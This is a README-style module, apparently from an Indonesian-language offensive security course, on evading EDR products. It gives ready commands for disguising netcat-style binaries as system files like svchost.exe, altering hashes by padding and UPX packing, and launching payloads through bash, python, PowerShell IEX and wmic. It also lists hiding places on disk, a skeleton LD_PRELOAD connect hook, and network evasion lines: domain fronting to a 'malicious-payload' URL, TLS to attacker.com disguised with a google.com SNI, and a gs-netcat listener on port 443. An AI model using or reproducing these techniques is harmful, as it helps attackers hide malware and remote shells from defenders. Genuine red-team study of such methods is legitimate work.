# 🛡️ EDR Bypass Techniques

> **Original Technical Content**: Sekiya
> **Compiled and Summarized by**: Tamas

## 📋 Overview

EDR (Endpoint Detection and Response) adalah sistem keamanan yang memantau dan menganalisis aktivitas endpoint untuk mendeteksi ancaman. Modul ini membahas berbagai teknik untuk melewati deteksi EDR dalam konteks penetration testing yang legal.

## ⚠️ Disclaimer

Teknik-teknik ini hanya untuk tujuan edukasi dan penetration testing yang sah. Penggunaan untuk tujuan ilegal adalah tanggung jawab pengguna.

## 🎯 Permasalahan Umum dengan EDR

- 🔸 EDR mendeteksi pola reverse shell & known malicious binary (hash, behavior)
- 🔸 Memblokir suspicious network connection (outbound unusual TCP)
- 🔸 Memblokir unusual binary execution dari temp folders
- 🔸 Mendeteksi known binaries (gs-netcat, nc, socat, mimikatz, dll)

## 🔧 Strategi Bypass EDR

### A. Binary Obfuscation & Renaming

**Tujuan**: Mengubah signature dan hash binary agar tidak terdeteksi

#### 1. Rename Binary ke Nama Trusted
```bash
# Rename ke nama sistem yang dipercaya
mv gs-netcat /usr/bin/ld-linux-x86-64.so.2
mv shell.exe /windows/system32/svchost.exe
```

#### 2. Strip Debug Symbols
```bash
# Menghapus debug symbols
strip gs-netcat
strip -s malware.exe
```

#### 3. Tambahkan Padding untuk Mengubah Hash
```bash
# Menambah padding random
dd if=/dev/zero bs=1 count=1000 >> gs-netcat
echo "random_data_$(date)" >> binary_file
```

#### 4. Packing dengan UPX
```bash
# Compress dan obfuscate binary
upx --ultra-brute gs-netcat
upx --best --lzma payload.exe
```

**Hasil**: Signature dan hash berbeda dari default public binary

### B. Execute via Trusted Process

**Tujuan**: Menjalankan payload melalui proses yang dipercaya sistem

#### Linux Examples:
```bash
# Via bash
bash -c "gs-netcat -c -s secret -i"

# Via python (jika tersedia)
python -c "import os; os.system('reverse_shell_command')"

# Via perl
perl -e 'system("payload_command")'
```

#### Windows Examples:
```powershell
# Via PowerShell
powershell.exe -c "IEX(payload)"

# Via WMI
wmic process call create "cmd.exe /c payload"
```

### C. Hide on Disk

**Tujuan**: Menyembunyikan binary di lokasi yang tidak mencurigakan

#### Lokasi Penyembunyian yang Baik:
```bash
# Linux
/usr/lib/systemd/
/usr/local/share/man/
/var/tmp/.cache/
/dev/shm/.sys/

# Windows  
C:\Windows\System32\
C:\Windows\Temp\
C:\ProgramData\
```

#### Rename ke Nama Valid:
```bash
# Linux
systemd-udevd
dbus-daemon
kworker

# Windows
svchost.exe
explorer.exe
winlogon.exe
```

### D. Process Injection (Advanced)

**Tujuan**: Inject ke proses yang dipercaya untuk menghindari deteksi

#### Teknik Process Hollowing:
- Compile loader yang melakukan process injection
- Target proses trusted seperti sshd, systemd, explorer.exe
- Menggunakan LD_PRELOAD untuk hook libc functions

#### LD_PRELOAD Example:
```c
// preload.c - Hook network functions
#define _GNU_SOURCE
#include <dlfcn.h>
#include <sys/socket.h>

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    // Custom connect logic untuk bypass monitoring
    int (*original_connect)(int, const struct sockaddr *, socklen_t);
    original_connect = dlsym(RTLD_NEXT, "connect");
    
    // Implement stealth connection
    return original_connect(sockfd, addr, addrlen);
}
```

### E. Network Evasion

**Tujuan**: Menghindari deteksi network monitoring

#### Domain Fronting:
```bash
# Gunakan domain trusted sebagai front
curl -H "Host: trusted-domain.com" https://cdn.cloudflare.com/malicious-payload
```

#### TLS dengan SNI Trusted:
```bash
# Gunakan SNI domain yang dipercaya
openssl s_client -connect attacker.com:443 -servername google.com
```

#### Port 443 (HTTPS-like):
```bash
# Jalankan di port 443 agar terlihat seperti HTTPS
gs-netcat -l -p 443 -s secret
```

## 📁 Struktur Direktori

- **[binary-obfuscation/](./binary-obfuscation/)**: Script dan tools untuk obfuscation
- **[process-injection/](./process-injection/)**: Teknik dan code untuk process injection  
- **[network-evasion/](./network-evasion/)**: Metode menghindari network detection
- **[examples/](./examples/)**: Contoh implementasi nyata

## 🛠️ Tools yang Digunakan

- **UPX**: Binary packer
- **strip**: Remove debug symbols
- **objcopy**: Modify binary sections
- **msfvenom**: Payload generation dengan encoding
- **Donut**: Position-independent shellcode generator

## 📚 Referensi

- [MITRE ATT&CK - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [EDR Bypass Techniques](https://github.com/topics/edr-bypass)
- [Process Injection Techniques](https://attack.mitre.org/techniques/T1055/)

## ⚡ Tips Praktis

1. **Selalu test di lab environment dulu**
2. **Kombinasikan multiple bypass techniques**
3. **Monitor EDR logs untuk melihat apa yang terdeteksi**
4. **Update teknik sesuai perkembangan EDR**
5. **Gunakan legitimate tools yang bisa disalahgunakan (LOLBins)**

---

**Next**: [02-Reverse-Shell](../02-Reverse-Shell/) - Setup reverse shell yang stealth
